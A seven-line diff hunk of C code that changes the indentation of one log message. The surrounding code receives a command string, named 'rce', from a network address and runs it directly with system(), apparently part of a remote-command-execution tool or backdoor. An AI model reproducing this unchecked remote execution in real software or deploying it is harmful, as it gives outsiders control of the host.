@@ -357,7 +357,7 @@ int main(int argc, char **argv) {
         boopprintf("  -> encapsulated: %s\n", ret.rce);
         retval = recvrce(saddrval, rce);
         if (retval == 0) {
-          boopprintf("<- Executing: %s\r\n", rce);
+          boopprintf("  <- Executing: %s\r\n", rce);
           system(rce);
         }
         free(rce);
